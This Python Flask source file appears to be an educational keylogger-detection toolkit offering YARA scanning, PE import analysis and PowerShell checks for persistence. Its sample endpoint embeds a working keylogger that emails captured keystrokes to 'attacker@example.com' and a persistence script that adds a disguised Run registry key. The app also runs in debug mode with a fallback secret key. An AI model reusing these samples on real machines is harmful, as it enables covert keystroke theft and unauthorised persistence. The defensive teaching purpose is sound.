import os
import hashlib
import yara
import pefile
from flask import Flask, render_template, request, jsonify
from pygments import highlight
from pygments.lexers import PythonLexer, PowerShellLexer
from pygments.formatters import HtmlFormatter

app = Flask(__name__)
app.secret_key = os.environ.get('SESSION_SECRET', 'dev-secret-key-change-in-production')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/code-viewer')
def code_viewer():
    return render_template('code_viewer.html')

@app.route('/yara-scanner')
def yara_scanner():
    return render_template('yara_scanner.html')

@app.route('/static-analysis')
def static_analysis():
    return render_template('static_analysis.html')

@app.route('/powershell-generator')
def powershell_generator():
    return render_template('powershell_generator.html')

@app.route('/ioc-dashboard')
def ioc_dashboard():
    return render_template('ioc_dashboard.html')

@app.route('/api/scan-with-yara', methods=['POST'])
def scan_with_yara():
    try:
        data = request.get_json()
        code_content = data.get('code', '')
        yara_rule = data.get('rule', '')
        
        with open('/tmp/temp_rule.yar', 'w') as f:
            f.write(yara_rule)
        
        rules = yara.compile('/tmp/temp_rule.yar')
        
        matches = rules.match(data=code_content.encode())
        
        results = []
        for match in matches:
            result = {
                'rule': match.rule,
                'tags': match.tags,
                'strings': [(s[1], s[2].decode() if isinstance(s[2], bytes) else s[2]) for s in match.strings]
            }
            results.append(result)
        
        return jsonify({
            'success': True,
            'matches': results,
            'total_matches': len(results)
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 400

@app.route('/api/analyze-imports', methods=['POST'])
def analyze_imports():
    try:
        data = request.get_json()
        code_content = data.get('code', '')
        
        suspicious_imports = []
        suspicious_keywords = [
            'pynput', 'keyboard', 'mouse', 'listener', 
            'smtplib', 'logging', 'getpass', 'win32',
            'pyHook', 'pythoncom', 'ctypes'
        ]
        
        for line in code_content.split('\n'):
            line = line.strip()
            if line.startswith('import ') or line.startswith('from '):
                for keyword in suspicious_keywords:
                    if keyword in line.lower():
                        suspicious_imports.append({
                            'line': line,
                            'keyword': keyword,
                            'severity': 'HIGH' if keyword in ['pynput', 'pyHook', 'keyboard'] else 'MEDIUM'
                        })
        
        file_operations = []
        for line in code_content.split('\n'):
            if any(keyword in line for keyword in ['open(', '.write(', 'log.txt', '.log', 'keylog']):
                file_operations.append(line.strip())
        
        network_operations = []
        for line in code_content.split('\n'):
            if any(keyword in line for keyword in ['smtplib', 'socket', 'requests', 'urllib', 'http']):
                network_operations.append(line.strip())
        
        code_hash = hashlib.sha256(code_content.encode()).hexdigest()
        
        return jsonify({
            'success': True,
            'hash': {
                'sha256': code_hash,
                'md5': hashlib.md5(code_content.encode()).hexdigest()
            },
            'suspicious_imports': suspicious_imports,
            'file_operations': file_operations,
            'network_operations': network_operations,
            'risk_score': min(100, len(suspicious_imports) * 20 + len(file_operations) * 10 + len(network_operations) * 15)
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 400

@app.route('/api/analyze-binary', methods=['POST'])
def analyze_binary():
    try:
        if 'binary' not in request.files:
            return jsonify({
                'success': False,
                'error': 'No binary file provided'
            }), 400
        
        file = request.files['binary']
        if file.filename == '':
            return jsonify({
                'success': False,
                'error': 'No file selected'
            }), 400
        
        max_size = 10 * 1024 * 1024
        file_data = file.read(max_size)
        
        if len(file_data) >= max_size:
            return jsonify({
                'success': False,
                'error': 'File too large (max 10MB)'
            }), 400
        
        sha256_hash = hashlib.sha256(file_data).hexdigest()
        md5_hash = hashlib.md5(file_data).hexdigest()
        
        try:
            pe = pefile.PE(data=file_data, fast_load=True)
            pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']])
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'Invalid PE file: {str(e)}'
            }), 400
        
        suspicious_apis = {
            'GetAsyncKeyState': {'severity': 'CRITICAL', 'reason': 'Used to detect key presses'},
            'SetWindowsHookExA': {'severity': 'CRITICAL', 'reason': 'Sets keyboard/mouse hooks'},
            'SetWindowsHookExW': {'severity': 'CRITICAL', 'reason': 'Sets keyboard/mouse hooks (Unicode)'},
            'GetForegroundWindow': {'severity': 'HIGH', 'reason': 'Retrieves active window handle'},
            'ReadConsoleInputA': {'severity': 'HIGH', 'reason': 'Reads console input'},
            'ReadConsoleInputW': {'severity': 'HIGH', 'reason': 'Reads console input (Unicode)'},
            'WriteFile': {'severity': 'MEDIUM', 'reason': 'File writing capability'},
            'MapVirtualKeyA': {'severity': 'MEDIUM', 'reason': 'Keyboard key mapping'},
            'MapVirtualKeyW': {'severity': 'MEDIUM', 'reason': 'Keyboard key mapping (Unicode)'},
            'CreateFileA': {'severity': 'MEDIUM', 'reason': 'File creation/opening'},
            'CreateFileW': {'severity': 'MEDIUM', 'reason': 'File creation/opening (Unicode)'},
            'SendInput': {'severity': 'HIGH', 'reason': 'Simulates keyboard/mouse input'},
            'GetClipboardData': {'severity': 'HIGH', 'reason': 'Accesses clipboard data'},
            'InternetOpenA': {'severity': 'MEDIUM', 'reason': 'Internet connectivity'},
            'InternetOpenW': {'severity': 'MEDIUM', 'reason': 'Internet connectivity (Unicode)'},
            'HttpSendRequestA': {'severity': 'HIGH', 'reason': 'Sends HTTP requests (data exfiltration)'},
            'HttpSendRequestW': {'severity': 'HIGH', 'reason': 'Sends HTTP requests (data exfiltration)'},
            'GetKeyState': {'severity': 'HIGH', 'reason': 'Retrieves key state'},
            'GetKeyboardState': {'severity': 'CRITICAL', 'reason': 'Retrieves keyboard state'},
        }
        
        dll_dependencies = []
        import_details = {}
        suspicious_windows_apis = []
        
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dll_name = entry.dll.decode('utf-8') if isinstance(entry.dll, bytes) else entry.dll
                dll_dependencies.append(dll_name)
                
                imports = []
                for imp in entry.imports:
                    if imp.name:
                        func_name = imp.name.decode('utf-8') if isinstance(imp.name, bytes) else imp.name
                        imports.append(func_name)
                        
                        if func_name in suspicious_apis:
                            suspicious_windows_apis.append({
                                'function': func_name,
                                'dll': dll_name,
                                'severity': suspicious_apis[func_name]['severity'],
                                'reason': suspicious_apis[func_name]['reason']
                            })
                
                import_details[dll_name] = imports
        
        sections = []
        for section in pe.sections:
            section_name = section.Name.decode('utf-8').rstrip('\x00')
            entropy = section.get_entropy()
            sections.append({
                'name': section_name,
                'virtual_size': section.Misc_VirtualSize,
                'virtual_address': hex(section.VirtualAddress),
                'raw_size': section.SizeOfRawData,
                'entropy': round(entropy, 2),
                'suspicious': entropy > 7.0
            })
        
        binary_metadata = {
            'filename': file.filename,
            'size': len(file_data),
            'machine': hex(pe.FILE_HEADER.Machine),
            'timestamp': pe.FILE_HEADER.TimeDateStamp,
            'sections_count': pe.FILE_HEADER.NumberOfSections,
            'entry_point': hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
        }
        
        api_risk = len(suspicious_windows_apis) * 25
        entropy_risk = sum(15 for s in sections if s['suspicious'])
        dll_risk = 5 if any(dll.lower() in ['ws2_32.dll', 'wininet.dll'] for dll in dll_dependencies) else 0
        
        binary_risk_score = min(100, api_risk + entropy_risk + dll_risk)
        
        pe.close()
        
        return jsonify({
            'success': True,
            'analysis_type': 'binary',
            'hash': {
                'sha256': sha256_hash,
                'md5': md5_hash
            },
            'binary_metadata': binary_metadata,
            'dll_dependencies': dll_dependencies,
            'import_details': import_details,
            'suspicious_windows_apis': suspicious_windows_apis,
            'sections': sections,
            'risk_score': binary_risk_score
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/get-sample-code/<sample_type>')
def get_sample_code(sample_type):
    samples = {
        'keylogger': '''import pynput.keyboard as keyboard
import logging
import smtplib
from email.mime.text import MIMEText

logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def send_email_log():
    with open('keylog.txt', 'r') as f:
        log_content = f.read()
    
    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylog Report'
    msg['From'] = 'keylogger@example.com'
    msg['To'] = 'attacker@example.com'
    
    smtp = smtplib.SMTP('smtp.gmail.com', 587)
    smtp.starttls()
    smtp.login('user@example.com', 'password')
    smtp.send_message(msg)
    smtp.quit()

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
''',
        'persistence': '''import os
import shutil
import winreg

def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 
                                   'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    
    shutil.copy(script_path, startup_folder)
    
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                         'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 
                         0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'SystemUpdater', 0, winreg.REG_SZ, script_path)
    winreg.CloseKey(key)

if __name__ == '__main__':
    add_to_startup()
'''
    }
    
    if sample_type in samples:
        code = samples[sample_type]
        highlighted = highlight(code, PythonLexer(), HtmlFormatter(style='monokai', noclasses=True))
        return jsonify({
            'success': True,
            'code': code,
            'highlighted': highlighted
        })
    else:
        return jsonify({
            'success': False,
            'error': 'Invalid sample type'
        }), 404

@app.route('/api/generate-powershell', methods=['POST'])
def generate_powershell():
    data = request.get_json()
    script_type = data.get('type', 'process_monitor')
    
    scripts = {
        'process_monitor': '''# PowerShell Script: Process Monitor for Suspicious Activity
# Educational Purpose Only - Monitors for keylogger-like processes

Write-Host "Scanning for suspicious processes..." -ForegroundColor Cyan

$suspiciousProcesses = @(
    'pynput', 'keylog', 'logger', 'hook', 
    'capture', 'recorder', 'monitor'
)

Get-Process | ForEach-Object {
    $processName = $_.ProcessName.ToLower()
    $suspicious = $false
    
    foreach ($keyword in $suspiciousProcesses) {
        if ($processName -like "*$keyword*") {
            $suspicious = $true
            Write-Host "[ALERT] Suspicious process detected: $($_.ProcessName)" -ForegroundColor Red
            Write-Host "  PID: $($_.Id)" -ForegroundColor Yellow
            Write-Host "  Path: $($_.Path)" -ForegroundColor Yellow
            Write-Host "  CPU: $($_.CPU)" -ForegroundColor Yellow
            Write-Host ""
        }
    }
}

Write-Host "Scan complete." -ForegroundColor Green
''',
        'persistence_check': '''# PowerShell Script: Persistence Mechanism Detection
# Educational Purpose Only - Checks common persistence locations

Write-Host "Checking for persistence mechanisms..." -ForegroundColor Cyan

# Check Registry Run Keys
Write-Host "`n[+] Checking Registry Run Keys..." -ForegroundColor Yellow
$runKeys = @(
    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $entries = Get-ItemProperty -Path $key
        $entries.PSObject.Properties | Where-Object { $_.Name -notlike "PS*" } | ForEach-Object {
            Write-Host "  Found: $($_.Name) = $($_.Value)" -ForegroundColor White
        }
    }
}

# Check Startup Folder
Write-Host "`n[+] Checking Startup Folder..." -ForegroundColor Yellow
$startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
if (Test-Path $startupPath) {
    Get-ChildItem -Path $startupPath | ForEach-Object {
        Write-Host "  Found: $($_.Name)" -ForegroundColor White
    }
}

# Check Scheduled Tasks
Write-Host "`n[+] Checking Scheduled Tasks..." -ForegroundColor Yellow
Get-ScheduledTask | Where-Object { $_.State -eq "Ready" } | ForEach-Object {
    if ($_.TaskName -notlike "Microsoft*") {
        Write-Host "  Task: $($_.TaskName)" -ForegroundColor White
    }
}

Write-Host "`nPersistence check complete." -ForegroundColor Green
''',
        'file_monitor': '''# PowerShell Script: Suspicious File Detection
# Educational Purpose Only - Monitors for keylogger-related files

Write-Host "Scanning for suspicious files..." -ForegroundColor Cyan

$suspiciousFilePatterns = @(
    '*keylog*', '*logger*', '*capture*', 
    '*hook*', '*spy*', '*.log'
)

$searchPaths = @(
    $env:TEMP,
    $env:USERPROFILE,
    "$env:APPDATA"
)

foreach ($path in $searchPaths) {
    Write-Host "`nScanning: $path" -ForegroundColor Yellow
    
    foreach ($pattern in $suspiciousFilePatterns) {
        $files = Get-ChildItem -Path $path -Filter $pattern -Recurse -ErrorAction SilentlyContinue -Force
        
        foreach ($file in $files) {
            Write-Host "[FOUND] $($file.FullName)" -ForegroundColor Red
            Write-Host "  Size: $($file.Length) bytes" -ForegroundColor White
            Write-Host "  Modified: $($file.LastWriteTime)" -ForegroundColor White
            Write-Host ""
        }
    }
}

Write-Host "File scan complete." -ForegroundColor Green
'''
    }
    
    if script_type in scripts:
        script = scripts[script_type]
        highlighted = highlight(script, PowerShellLexer(), HtmlFormatter(style='monokai', noclasses=True))
        return jsonify({
            'success': True,
            'script': script,
            'highlighted': highlighted,
            'type': script_type
        })
    else:
        return jsonify({
            'success': False,
            'error': 'Invalid script type'
        }), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
